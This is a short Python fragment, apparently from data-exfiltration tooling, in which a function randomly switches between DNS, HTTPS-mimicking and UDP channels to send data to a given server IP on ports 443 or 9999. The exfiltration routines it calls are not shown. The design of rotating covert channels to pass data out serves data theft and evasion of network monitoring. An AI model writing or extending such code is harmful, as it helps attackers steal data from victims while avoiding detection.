import random


def switch_mode(data: bytes, server_ip: str):

    mode = random.choice([1, 2, 3])
    
    if mode == 1:
        print("Switching to DNS mode")
        dns_exfiltrate(data, server_ip)
    elif mode == 2:
        print("Switching to HTTPS mode")
        https_mimicry_exfiltrate(data, server_ip, 443)
    elif mode == 3:
        print("Switching to UDP mode")
        udp_exfiltrate(data, server_ip, 9999)